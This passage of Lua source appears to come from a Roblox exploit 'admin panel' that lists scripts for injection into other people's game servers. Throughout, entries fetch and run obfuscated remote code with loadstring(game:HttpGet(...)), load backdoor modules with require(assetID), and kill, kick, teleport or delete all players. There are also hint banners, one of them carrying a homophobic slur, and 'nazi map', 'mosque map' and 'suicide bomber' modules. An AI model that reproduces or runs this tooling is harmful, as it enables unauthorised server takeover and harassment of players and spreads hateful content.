		end
	until math.floor(tick()) == start + duration
	con:Disconnect()

	for i,v in pairs(sounds) do
		v:Stop()
	end
]], "CS / SS")

cscript("script hub", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/ScriptHub"))()
]], "LS")

cscript("dominant executor", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/meowsynther/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/%5Bobf%5D%20dominant%20executor.lua"))()
]], "LS")

cscript("dank engine", [[
	require(8544809895).G("%replace%with%username%")
]], "RQ")

cscript("dank engine", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/meowsynther/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/%5Bobf%5D%20dank%20engine.lua"))()
]], "LS")

cscript("OPFinality", [[
	loadstring(game:HttpGet('https://rawscripts.net/raw/OpFinality_590'))()
]], "LS")

cscript("aquamatrix animations", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
]], "LS")

cscript("hydroxide", [[
local owner = "Upbolt"
local branch = "revision"

local function webImport(file)
    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
end

webImport("init")
webImport("ui/main")
]], "LS")

cscript("spiderbot", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/meowsynther/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/%5Bobf%5D%20spiderbot.lua"))()
]], "LS")

cscript("dual ultima", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/meowsynther/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/%5Bobf%5D%20dual%20ultima.lua"))()
]], "LS")

cscript("r6", [[
   require(10869521285).ConvertRig(game:GetService("Players").%replace%with%username%,Enum.HumanoidRigType.R6)
]], "RQ")

cscript("r15", [[
    require(10869521285).ConvertRig(game:GetService("Players").%replace%with%username%,Enum.HumanoidRigType.R15)
]], "RQ")

cscript("skidded ultima", [[
	require(76283695815175).unable("%replace%with%username%")
]], "RQ")

cscript("skidded ultima", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/meowsynther/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/%5Bobf%5D%20skidded%20ultima.lua"))()
]], "LS")

cscript("respawn character", [[
	game:GetService("Players"):FindFirstChild("%replace%with%username%"):LoadCharacter()
]], "CS / SS")

cscript("infinite yield alt", [[
	require(14035238433)("%replace%with%username%")
]], "RQ")

cscript("flamethrower", [[
	require(4666114735).load("%replace%with%username%")
]], "RQ")

cscript("team fat gui", [[
	require(14940596979).fat('%replace%with%username%')
]], "RQ")

cscript("insert spawn", [[
	local bro = Instance.new("SpawnLocation",workspace)
	bro.Anchored = true
]], "CS / SS")

cscript("kill all", [[
	for i,v in pairs(game:GetService("Players"):GetChildren()) do 
		if v:IsA("Player") then
			v.Character:BreakJoints()
		end
	end
]], "CS / SS")

cscript("kick all", [[
	for i,v in pairs(game:GetService("Players"):GetChildren()) do 
		if v:IsA("Player") then
			v:Kick(">:3c")
		end
	end
]], "CS / SS")

cscript("anti ban", [[
	require(2788315378).load(nil,%replace%with%username%)
]], "RQ")

cscript("char all BSoDed", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "7512887467"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("666", [[
	for i,v in next,workspace:children''do
		if(v:IsA'BasePart')then
			me=v;
			bbg=Instance.new('BillboardGui',me);
			bbg.Name='stuf';
			bbg.Adornee=me;
			bbg.Size=UDim2.new(2.5,0,2.5,0)
			bbg.StudsOffset=Vector3.new(0,2,0)
			tlb=Instance.new'TextLabel';
			tlb.Text='666 666 666 666 666 666';
			tlb.Font='SourceSansBold';
			tlb.FontSize='Size48';
			tlb.TextColor3=Color3.new(1,0,0);
			tlb.Size=UDim2.new(1.25,0,1.25,0);
			tlb.Position=UDim2.new(-0.125,-22,-1.1,0);
			tlb.BackgroundTransparency=1;
			tlb.Parent=bbg;
		end;end;
	function xds(dd)
		for i,v in next,dd:children''do
			if(v:IsA'BasePart')then
				v.BrickColor=BrickColor.new'Really black';
				v.TopSurface='Smooth';
				v.BottomSurface='Smooth';
				s=Instance.new('SelectionBox',v);
				s.Adornee=v;
				s.Color=BrickColor.new'Really red';
				a=Instance.new('PointLight',v);
				a.Color=Color3.new(1,0,0);
				a.Range=15;
				a.Brightness=5;
				f=Instance.new('Fire',v);
				f.Size=19;
				f.Heat=22;
			end;

			local dec = 'http://www.roblox.com/asset/?id=19399245';
			local fac = {'Front', 'Back', 'Left', 'Right', 'Top', 'Bottom'}
			if #(v:GetChildren())>0 then
				xds(v) 
			end
		end
	end
	xds(game.Workspace)
]], "CS / SS")

cscript("skeleton sky", [[
	imageOne="http://www.roblox.com/asset/?id=169585459"imageTwo="http://www.roblox.com/asset/?id=169585475"imageThree="http://www.roblox.com/asset/?id=169585485"imageFour="http://www.roblox.com/asset/?id=169585502"imageFive="http://www.roblox.com/asset/?id=169585515"imageSix="http://www.roblox.com/asset/?id=169585502"imageSeven="http://www.roblox.com/asset/?id=169585485"imageEight="http://www.roblox.com/asset/?id=169585475"Spooky=Instance.new("Sound",workspace)Spooky.Name="Spooky"Spooky.SoundId="rbxassetid://174270407"Spooky.Volume=15 Spooky.Looped=true Spooky:Play()Sky=Instance.new("Sky",game.Lighting)Sky.SkyboxBk=imageOne Sky.SkyboxDn=imageOne Sky.SkyboxFt=imageOne Sky.SkyboxLf=imageOne Sky.SkyboxRt=imageOne Sky.SkyboxUp=imageOne while true do Sky.SkyboxBk=imageOne Sky.SkyboxDn=imageOne Sky.SkyboxFt=imageOne Sky.SkyboxLf=imageOne Sky.SkyboxRt=imageOne Sky.SkyboxUp=imageOne wait(0.15)Sky.SkyboxBk=imageTwo Sky.SkyboxDn=imageTwo Sky.SkyboxFt=imageTwo Sky.SkyboxLf=imageTwo Sky.SkyboxRt=imageTwo Sky.SkyboxUp=imageTwo wait(0.15)Sky.SkyboxBk=imageThree Sky.SkyboxDn=imageThree Sky.SkyboxFt=imageThree Sky.SkyboxLf=imageThree Sky.SkyboxRt=imageThree Sky.SkyboxUp=imageThree wait(0.15)Sky.SkyboxBk=imageFour Sky.SkyboxDn=imageFour Sky.SkyboxFt=imageFour Sky.SkyboxLf=imageFour Sky.SkyboxRt=imageFour Sky.SkyboxUp=imageFour wait(0.15)Sky.SkyboxBk=imageFive Sky.SkyboxDn=imageFive Sky.SkyboxFt=imageFive Sky.SkyboxLf=imageFive Sky.SkyboxRt=imageFive Sky.SkyboxUp=imageFive wait(0.15)Sky.SkyboxBk=imageSix Sky.SkyboxDn=imageSix Sky.SkyboxFt=imageSix Sky.SkyboxLf=imageSix Sky.SkyboxRt=imageSix Sky.SkyboxUp=imageSix wait(0.15)Sky.SkyboxBk=imageSeven Sky.SkyboxDn=imageSeven Sky.SkyboxFt=imageSeven Sky.SkyboxLf=imageSeven Sky.SkyboxRt=imageSeven Sky.SkyboxUp=imageSeven wait(0.15)Sky.SkyboxBk=imageEight Sky.SkyboxDn=imageEight Sky.SkyboxFt=imageEight Sky.SkyboxLf=imageEight Sky.SkyboxRt=imageEight Sky.SkyboxUp=imageEight wait(0.15)end
]], "CS / SS")

cscript("char all c00lunable", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "7618879506"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("char all unable", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "3087640584"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("char all noxious", [[
		for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "7277426403"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("char all c00lkidd", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "8101069571"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("send all to the gate", [[
	local TeleportService = game:GetService("TeleportService")
	local Players = game:GetService("Players")

	for _, player in ipairs(Players:GetPlayers()) do
 	   if player and player:IsA("Player") then
  	        TeleportService:Teleport(109758127685691, player)
  	     end
	end
]], "CS / SS")

cscript("creepy lighting", [[
	local l = Instance.new("ColorCorrectionEffect",game.Lighting)
	l.Contrast,l.Saturation,l.Brightness = 2, -0.75, 0.375
	l.TintColor = Color3.new(1,0,0)
]], "CS / SS")

cscript("grab knife v3", [[
	require(2829943043):Run(game:GetService("Players").%replace%with%username%.Name,'i baked you a pie')
]], "RQ")

cscript("message", [[
local function write(text, object)
	if object:IsA("Message") == true then
		local count = object:FindFirstChild("Count")
		if count == nil then
			count = Instance.new("NumberValue")
			count.Parent = object
			count.Name = "Count"
			count.Value = count.Value + 1
		else
			count.Value = count.Value + 1
		end
		local startcount = count.Value
		for i = 1, #text do
			if count.Value == startcount then
				local letter = string.sub(text, i, i)
				object.Text = string.sub(text, 1, i)
				wait(0)
			else
				break
			end
		end

		wait(1)
		if count.Value == startcount then
			for i = #text, 1, -1 do
				if count.Value == startcount then
					object.Text = string.sub(text, 1, i - 1)
					wait(0)
				else
					break
				end
			end
			if count.Value == startcount then
				object:Destroy()
			end
		end
	end
end
local bro = Instance.new("Message",workspace)
bro.Name = "dontdeleteme"
write("WE ARE SO BACK. | gg/xZC8zJzF7u", bro)
]], "CS / SS")

cscript("create baseplate", [[
	baseplate = Instance.new("Part")
	baseplate.Name = "Baseplate"
	baseplate.Size = Vector3.new(2048, 16, 2048)
	baseplate.Anchored = true
	baseplate.Position = Vector3.new(0, 0, 0)
	baseplate.BrickColor = BrickColor.new("Dark grey metallic")
	baseplate.Material = Enum.Material.Plastic
	baseplate.Parent = workspace
		
	txt = Instance.new("Texture")
	txt.Texture = "rbxassetid://6372755229"
	txt.Parent = baseplate
]], "CS / SS")

cscript("polaria", [[
	require(123255432303221):Pload("%replace%with%username%")
]], "RQ")

cscript("polaria", [[
	loadstring(game:HttpGet("https://pastefy.app/agqEB2qs/raw",true))()
]], "LS")

cscript("nazi map", [[
	require(139666139485072).load("%replace%with%username%")
]], "RQ")

cscript("suicide pistol", [[
	require(3023538289).load("%replace%with%username%")
]], "RQ")

cscript("tornado", [[
	require(16178147710).load("%replace%with%username%")
]], "RQ")

cscript("helicopter", [[
	require(9230060018).RAroblox("%replace%with%username%")
]], "RQ")

cscript("infinite yield bytecode", [[
	require(13716575182)("%replace%with%username%")
]], "RQ")

cscript("suicide bomber v2", [[
	require(0x49731b7f).load("%replace%with%username%")
]], "RQ")

cscript("mosque map", [[
	require(131945008071397).map("%replace%with%username%")
]], "RQ")

cscript("steve", [[
local player = game:GetService("Players"):FindFirstChild("%replace%with%username%")
if player then
    local character = player.Character or player:WaitForChild("Character")
    
    for _, v in pairs(character:GetChildren()) do
        if v:IsA("Accessory") then
            v:Destroy()
        end
    end
end
require(15581949972).mc("%replace%with%username%")
]], "RQ")

cscript("spawn noobs", [[
	require(5193737424)("%replace%with%username%", false)
]], "RQ")

cscript("NDS", [[
	require(14704225060).nds("%replace%with%username%")
]], "RQ")

cscript("doge army", [[
	require(5115249013).fehack("%replace%with%username%")
]], "RQ")

cscript("c4", [[
	require(0x1767bf813)("%replace%with%username%")
]], "RQ")

cscript("alif gunman", [[
	require(96378053590566).gunman("%replace%with%username%")
]], "RQ")

cscript("retester ST", [[
	require(136379675730375).verybig("%replace%with%username%")
]], "RQ")

cscript("T0PK3K V5.3", [[
	require(0x342D5F0DA)("%replace%with%username%")
]], "RQ")

cscript("T0PK3K V3", [[
	require(2609384717).load("%replace%with%username%")
]], "RQ")

cscript("uzi", [[
	require(4746064028).load("%replace%with%username%")
]], "RQ")

cscript("excavator", [[
	require(16999802471)("%replace%with%username%")
]], "RQ")

cscript("patrick's wraith", [[
	require(12102103065).Patrick("%replace%with%username%")
]], "RQ")

cscript("insulting message", [[
    local hint = Instance.new("Hint")
    hint.Text = "stop using c00lgui and / or other bullshit guis and focus more on not making / executing scripts that plaster your faggy avatar all over the map, you literal zygotes. "
    hint.Parent = workspace
    hint.Name = "dontdeleteme"

    local message = "stop using c00lgui and / or other bullshit guis and focus more on not making / executing scripts that plaster your faggy avatar all over the map, you literal zygotes. "
    local scrollIndex = 1

    while true do
        local shiftedMessage = message:sub(scrollIndex) .. message:sub(1, scrollIndex - 1)
        hint.Text = shiftedMessage
        wait(0.1)
        scrollIndex = scrollIndex + 1
        if scrollIndex > #message then
            scrollIndex = 1
        end
    end
]], "CS / SS")

cscript("KFC map", [[
	require(3615713971).load()
]], "RQ")

cscript("stummy guns", [[
	require(14671740203)("%replace%with%username%", "Guns")
]], "RQ")

cscript("bow v2", [[
	require(4560072580).load("%replace%with%username%")
]], "RQ")

cscript("server admin", [[
	require(4665394711).load("%replace%with%username%")
]], "RQ")

cscript("server admin", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/meowsynther/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/%5Bobf%5D%20server%20admin.lua"))()
]], "LS")

cscript("chara", [[
	require(5845670816).load("%replace%with%username%")
]], "RQ")

cscript("soul reaper", [[
	require(7972086233).CLoad("%replace%with%username%")
]], "RQ")

cscript("sledge hammer", [[
	require(8038037940).CLoad("%replace%with%username%")
]], "RQ")

cscript("chrona", [[
	require(4661847142).load("%replace%with%username%")
]], "RQ")

cscript("neptunian V", [[
	require(4661705712).load("%replace%with%username%")
]], "RQ")

cscript("sadist", [[
	require(4665990665).load("%replace%with%username%")
]], "RQ")

cscript("bangang", [[
	require(4659214877).Lunar("%replace%with%username%")
]], "RQ")

cscript("xester", [[
	require(2918747265).load("%replace%with%username%")
]], "RQ")

cscript("cyclone message", [[
    local hint = Instance.new("Hint")
    hint.Text = "I'VE BEEN WAITING FOR THE SAVE... "
    hint.Name = "dontdeleteme"
    hint.Parent = workspace

    local message = "I'VE BEEN WAITING FOR THE SAVE... "
    local scrollIndex = 1

    while true do
        local shiftedMessage = message:sub(scrollIndex) .. message:sub(1, scrollIndex - 1)
        hint.Text = shiftedMessage
        wait(0.1)
        scrollIndex = scrollIndex + 1
        if scrollIndex > #message then
            scrollIndex = 1
        end
    end
]], "CS / SS")

cscript("SSP", [[
	require(16920033857)("%replace%with%username%")
]], "RQ")

cscript("trash hub", [[
	require(17182254638)("%replace%with%username%")
]], "RQ")

cscript("stratosphere", [[
	require(6535776034).load("%replace%with%username%")
]], "RQ")

cscript("sheldoni", [[
	require(15629007042)("%replace%with%username%")
]], "RQ")

cscript("blast ss", [[
	require(5596373023).load(plr.Name)
]], "RQ")

cscript("mouse.avi map", [[
	require(9974938026).map()
]], "RQ")

cscript("shake baseplate", [[
		local myBaseplate = game.Workspace.Baseplate 

	while true do
		myBaseplate.Orientation = Vector3.new(0.1,0,0.1)
		wait()
		myBaseplate.Orientation = Vector3.new(0.3,0,0.3)
		wait()
		myBaseplate.Orientation = Vector3.new(0.5,0,0.5)
		wait()
		myBaseplate.Orientation = Vector3.new(0.7,0,0.7)
		wait()
		myBaseplate.Orientation = Vector3.new(0.9,0,0.9)
		wait()
		myBaseplate.Orientation = Vector3.new(1.1,0,1.1)
		wait()
		myBaseplate.Orientation = Vector3.new(1.3,0,1.3)
		wait()
		myBaseplate.Orientation = Vector3.new(1.5,0,1.5)
		wait()
		myBaseplate.Orientation = Vector3.new(1.7,0,1.7)
		wait()
		myBaseplate.Orientation = Vector3.new(1.9,0,1.9)
		wait()
		myBaseplate.Orientation = Vector3.new(2.1,0,2.1)
		wait()
		myBaseplate.Orientation = Vector3.new(2.3,0,2.3)
		wait()
		myBaseplate.Orientation = Vector3.new(2.5,0,2.5)
		wait()
		myBaseplate.Orientation = Vector3.new(2.7,0,2.7)
		wait()
		myBaseplate.Orientation = Vector3.new(2.9,0,2.9)
		wait()
		myBaseplate.Orientation = Vector3.new(3.1,0,3.1)
		wait()
		myBaseplate.Orientation = Vector3.new(3.3,0,3.3)
		wait()
		myBaseplate.Orientation = Vector3.new(3.5,0,3.5)
		wait()
		myBaseplate.Orientation = Vector3.new(3,7,0,3.7)
		wait()
		myBaseplate.Orientation = Vector3.new(3.9,0,3.9)
		wait()
		myBaseplate.Orientation = Vector3.new(4.1,0,4.1)
		wait()
		myBaseplate.Orientation = Vector3.new(4.3,0,4.3)
		wait()
		myBaseplate.Orientation = Vector3.new(4.5,0,4.5)
		wait()
		myBaseplate.Orientation = Vector3.new(4.7,0,4.7)
		wait()
		myBaseplate.Orientation = Vector3.new(4.9,0,4.9)
		wait()
		myBaseplate.Orientation = Vector3.new(4.7,0,4.7)
		wait()
		myBaseplate.Orientation = Vector3.new(4.5,0,4.5)
		wait()
		myBaseplate.Orientation = Vector3.new(4.3,0,4.3)
		wait()
		myBaseplate.Orientation = Vector3.new(4.1,0,4.1)
		wait()
		myBaseplate.Orientation = Vector3.new(3.9,0,3.9)
		wait()
		myBaseplate.Orientation = Vector3.new(3.7,0,3.7)
		wait()
		myBaseplate.Orientation = Vector3.new(3.5,0,3.5)
		wait()
		myBaseplate.Orientation = Vector3.new(3.3,0,3.3)
		wait()
		myBaseplate.Orientation = Vector3.new(3.1,0,3.1)
		wait()
		myBaseplate.Orientation = Vector3.new(2.9,0,2.9)
		wait()
		myBaseplate.Orientation = Vector3.new(2.7,0,2.7)
		wait()
		myBaseplate.Orientation = Vector3.new(2.5,0,2.5)
		wait()
		myBaseplate.Orientation = Vector3.new(2.3,0,2.3)
		wait()
		myBaseplate.Orientation = Vector3.new(2.1,0,2.1)
		wait()
		myBaseplate.Orientation = Vector3.new(1.9,0,1.9)
		wait()
		myBaseplate.Orientation = Vector3.new(1.7,0,1.7)
		wait()
		myBaseplate.Orientation = Vector3.new(1.5,0,1.5)
		wait()
		myBaseplate.Orientation = Vector3.new(1.3,0,1.3)
		wait()
		myBaseplate.Orientation = Vector3.new(1.1,0,1.1)
		wait()
		myBaseplate.Orientation = Vector3.new(0.9,0,0.9)
		wait()
		myBaseplate.Orientation = Vector3.new(0.7,0,0.7)
		wait()
		myBaseplate.Orientation = Vector3.new(0.5,0,0.5)
		wait()
		myBaseplate.Orientation = Vector3.new(0.3,0,0.3)
		wait()
		myBaseplate.Orientation = Vector3.new(0.1,0,0.1)
		wait()
	end
]], "CS / SS")

cscript("blurple lighting", [[
    local l = Instance.new("ColorCorrectionEffect",game.Lighting)
	l.Contrast,l.Saturation,l.Brightness = 2, -0.75, 0.375
	l.TintColor = Color3.fromHex("4051ED")
]], "CS / SS")

cscript("nullioner", [[
	require(7972181516).CLoad("%replace%with%username%")
]], "RQ")

cscript("crawl", [[
	require(7972019185).CLoad("%replace%with%username%")
]], "RQ")

cscript("the sun is a deadly laser", [[
	require(4528360948):Fire("%replace%with%username%", "hack")
]], "RQ")

cscript("delinquent", [[
	require(1525600089).goldentec("%replace%with%username%")
]], "RQ")

cscript("the alchemist", [[
	require(6224178099).load("%replace%with%username%")
]], "RQ")

cscript("killing machine", [[
	require(6375409514).load("%replace%with%username%")
]], "RQ")

cscript("hololive fubiki", [[
	require(5907637844).load("%replace%with%username%")
]], "RQ")

cscript("dimensiona", [[
	require(4957540270).load("%replace%with%username%")
]], "RQ")

cscript("fiery switcher", [[
	require(5748722400).eliza("%replace%with%username%")
]], "RQ")

cscript("split head", [[
	require(5760009753).load("%replace%with%username%")
]], "RQ")

cscript("killbot", [[
	require(6688474792).load("%replace%with%username%")
]], "RQ")

cscript("fight mode", [[
	require(6438401832).load("%replace%with%username%")
]], "RQ")

cscript("lunatic", [[
	require(5813708464).load("%replace%with%username%")
]], "RQ")

cscript("burn", [[
	require(6478479994).load("%replace%with%username%")
]], "RQ")

cscript("pink barbie car", [[
	require(4745872847).load("%replace%with%username%")
]], "RQ")

cscript("star platinum", [[
	require(5534238329)("%replace%with%username%", "StarPlatinum")
]], "RQ")

cscript("archangel", [[
	require(2972034986):Fire("%replace%with%username%", "test")
]], "RQ")

cscript("blind reaper", [[
	require(4665382251).load("%replace%with%username%")
]], "RQ")

cscript("felipe ascension", [[
	require(5339034667):Start("%replace%with%username%", "AAA")
]], "RQ")

cscript("big glock thing", [[
	require(2959952198):Fire("%replace%with%username%", "test")
]], "RQ")

cscript("chainsaw", [[
	require(4560014954).load("%replace%with%username%")
]], "RQ")

cscript("john wick", [[
	require(4721853215):Fire("%replace%with%username%")
]], "RQ")

cscript("wpxne tools", [[
	require(9971661842):wpnxe("%replace%with%username%")
]], "RQ")

cscript("clear sounds", [[
	for _, sound in pairs(game:GetDescendants()) do
		if sound:IsA("Sound") and sound.Name ~= "dontdeleteme" and sound.Name ~= "canttouchthis" then
			sound:Destroy()
		end
	end
]], "CS / SS")

cscript("clear labeled sounds", [[
	for _, sound in pairs(game:GetDescendants()) do
		if sound:IsA("Sound") and sound.Name == "dontdeleteme" then
			sound:Destroy()
		end
	end
]], "CS / SS")

cscript("clear unlabeled sounds", [[
	for _, sound in pairs(game:GetDescendants()) do
		if sound:IsA("Sound") and sound.Name ~= "dontdeleteme" and sound.Name ~= "canttouchthis" then
			sound:Destroy()
		end
	end
]], "CS / SS")

cscript("self destruct", [[
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local debounce = false

local function createExplosion(position)
	local outerSphere = Instance.new("Part")
	outerSphere.Shape = Enum.PartType.Ball
	outerSphere.Size = Vector3.new(1, 1, 1)
	outerSphere.Anchored = true
	outerSphere.CanCollide = false
	outerSphere.Material = Enum.Material.Neon
	outerSphere.Color = Color3.fromHex("4051ED")
	outerSphere.Transparency = 0.2
	outerSphere.CFrame = CFrame.new(position)
	outerSphere.Name = "ExplosionSphere"
	outerSphere.Parent = workspace

	local innerSphere = Instance.new("Part")
	innerSphere.Shape = Enum.PartType.Ball
	innerSphere.Size = Vector3.new(0.85, 0.85, 0.85)
	innerSphere.Anchored = true
	innerSphere.CanCollide = false
	innerSphere.Material = Enum.Material.Neon
	innerSphere.Color = Color3.new(1, 1, 1)
	innerSphere.Transparency = 0.6
	innerSphere.CFrame = CFrame.new(position)
	innerSphere.Parent = outerSphere

	local touchedParts = {}

	local function affectObject(hit)
		if touchedParts[hit] then return end
		touchedParts[hit] = true

		local model = hit:FindFirstAncestorOfClass("Model")
		local hum = model and model:FindFirstChildWhichIsA("Humanoid")

		if hum and hum.Health > 0 and model ~= player.Character then
			hum.Health = 0
		end
	end

	outerSphere.Touched:Connect(affectObject)
	innerSphere.Touched:Connect(affectObject)

	for _, obj in pairs(workspace:GetDescendants()) do
		if obj:IsA("BasePart") then
			local distance = (obj.Position - position).Magnitude
			if distance <= 10 then
				affectObject(obj)
			end
		end
	end

	local boom = Instance.new("Sound")
	boom.SoundId = "rbxassetid://128993426058979"
	boom.Volume = 5
	boom.TimePosition = 0.2
	boom.PlayOnRemove = true
	boom.Parent = outerSphere
	boom:Destroy()

	local boom2 = Instance.new("Sound")
	boom2.SoundId = "rbxassetid://9057675920"
	boom2.Volume = 10
	boom2.TimePosition = 0.5
	boom2.PlayOnRemove = true
	boom2.Parent = outerSphere
	boom2:Destroy()

	task.spawn(function()
		local totalTime = 4
		local start = tick()
		while tick() - start < totalTime do
			local progress = (tick() - start) / totalTime
			local size = 1 + (180 - 1) * progress
			local transparency = 0.2 + (1 - 0.2) * progress
			local innerTransparency = 0.6 + (1 - 0.6) * progress

			outerSphere.Size = Vector3.new(size, size, size)
			innerSphere.Size = Vector3.new(size * 0.95, size * 0.95, size * 0.95)

			outerSphere.Transparency = transparency
			innerSphere.Transparency = innerTransparency

			outerSphere.CFrame = CFrame.new(position)
			innerSphere.CFrame = CFrame.new(position)

			RunService.RenderStepped:Wait()
		end
		outerSphere:Destroy()
	end)
end

local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:FindFirstChild("HumanoidRootPart")
local hum = character:FindFirstChildWhichIsA("Humanoid")

for _, part in ipairs(character:GetDescendants()) do
	if part:IsA("BasePart") or part:IsA("Decal") then
		part.Transparency = 1
	end
	if part:IsA("BasePart") then
		part.Anchored = true
	end
end

if hrp then
	createExplosion(hrp.Position)
end

if hum then
	hum.Health = 0
end
]], "CS / SS")

cscript("godmode", [[
local Players = game:GetService("Players")
local player = Players.LocalPlayer

coroutine.wrap(function()
	while true do
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		
		if humanoid then
			humanoid.MaxHealth = 99999
			humanoid.Health = 99999
		end

		if not character:FindFirstChildOfClass("ForceField") then
			local ff = Instance.new("ForceField")
			ff.Visible = false
			ff.Parent = character
		end

		task.wait(0)
	end
end)()
]], "CS / SS")

cscript("set map on fire", [[
local fyecol = Color3.fromHex("4051ED")
local secfyecol = Color3.fromHex("99a3ff")

function fyre(obj)
    if obj:IsA("BasePart") then
        local fye = Instance.new("Fire")
        fye.Size = 10
        fye.Heat = 1
        fye.Color = fyecol
        fye.SecondaryColor = secfyecol
        fye.Parent = obj
    end
end

for _, item in pairs(workspace:GetDescendants()) do
    fyre(item)
end
]], "CS / SS")

cscript("clear players", [[
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

for _, player in pairs(Players:GetPlayers()) do
	if player ~= localPlayer then
		player:Destroy()
	end
end

for _, item in pairs(workspace:GetChildren()) do
	if item:IsA("Model") and Players:GetPlayerFromCharacter(item) and Players:GetPlayerFromCharacter(item) ~= localPlayer then
		item:Destroy()
	end
end
]], "CS / SS")

cscript("clear messages", [[
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") then
				message:Destroy()
			end
		end
]], "CS / SS")

cscript("clear labeled messages", [[
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name == "dontdeleteme" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name == "dontdeleteme" then
				message:Destroy()
			end
		end
]], "CS / SS")

cscript("clear unlabeled messages", [[
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "dontdeleteme" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "dontdeleteme" then
				message:Destroy()
			end
		end
]], "CS / SS")

cscript("billboard psa", [[
local imageId = "rbxassetid://79869170880681"

function createBillboardGui(part)
	local existingGui = part:FindFirstChildOfClass("BillboardGui")
	if existingGui then existingGui:Destroy() end

	local billboardGui = Instance.new("BillboardGui")			
	billboardGui.Size = UDim2.new(20, 0, 10, 0)
	billboardGui.AlwaysOnTop = true
	billboardGui.Parent = part
	billboardGui.Adornee = part

	local imageLabel = Instance.new("ImageLabel")			
	imageLabel.Size = UDim2.new(1, 0, 1, 0)
	imageLabel.Image = imageId
	imageLabel.BackgroundTransparency = 1
	imageLabel.Parent = billboardGui
end

function isPlayerHead(part)
	return part:IsA("Part") and part.Name == "Head"
		and part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
end

function addBillboardGuis()
	for _, descendant in pairs(workspace:GetDescendants()) do
		if isPlayerHead(descendant) then
			createBillboardGui(descendant)
		end
	end

	workspace.DescendantAdded:Connect(function(newDescendant)
		if isPlayerHead(newDescendant) then
			createBillboardGui(newDescendant)
		end
	end)
end

addBillboardGuis()
]], "CS / SS")

cscript("self destruct on death", [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

local function createExplosion(position)
	local outerSphere = Instance.new("Part")
	outerSphere.Shape = Enum.PartType.Ball
	outerSphere.Size = Vector3.new(1, 1, 1)
	outerSphere.Anchored = true
	outerSphere.CanCollide = false
	outerSphere.Material = Enum.Material.Neon
	outerSphere.Color = Color3.fromHex("4051ED")
	outerSphere.Transparency = 0.2
	outerSphere.CFrame = CFrame.new(position)
	outerSphere.Name = "ExplosionSphere"
	outerSphere.Parent = workspace

	local innerSphere = Instance.new("Part")
	innerSphere.Shape = Enum.PartType.Ball
	innerSphere.Size = Vector3.new(0.85, 0.85, 0.85)
	innerSphere.Anchored = true
	innerSphere.CanCollide = false
	innerSphere.Material = Enum.Material.Neon
	innerSphere.Color = Color3.new(1, 1, 1)
	innerSphere.Transparency = 0.6
	innerSphere.CFrame = CFrame.new(position)
	innerSphere.Parent = outerSphere

	local touchedParts = {}

	local function affectObject(hit)
		if touchedParts[hit] then return end
		touchedParts[hit] = true

		local model = hit:FindFirstAncestorOfClass("Model")
		local hum = model and model:FindFirstChildWhichIsA("Humanoid")

		if hum and hum.Health > 0 and model ~= player.Character then
			hum.Health = 0
		end
	end

	outerSphere.Touched:Connect(affectObject)
	innerSphere.Touched:Connect(affectObject)

	for _, obj in pairs(workspace:GetDescendants()) do
		if obj:IsA("BasePart") then
			local distance = (obj.Position - position).Magnitude
			if distance <= 10 then
				affectObject(obj)
			end
		end
	end

	local boom = Instance.new("Sound")
	boom.SoundId = "rbxassetid://128993426058979"
	boom.Volume = 5
	boom.TimePosition = 0.2
	boom.PlayOnRemove = true
	boom.Parent = outerSphere
	boom:Destroy()

	local boom2 = Instance.new("Sound")
	boom2.SoundId = "rbxassetid://9057675920"
	boom2.Volume = 10
	boom2.TimePosition = 0.5
	boom2.PlayOnRemove = true
	boom2.Parent = outerSphere
	boom2:Destroy()

	task.spawn(function()
		local totalTime = 4
		local start = tick()
		while tick() - start < totalTime do
			local progress = (tick() - start) / totalTime
			local size = 1 + (180 - 1) * progress
			local transparency = 0.2 + (1 - 0.2) * progress
			local innerTransparency = 0.6 + (1 - 0.6) * progress

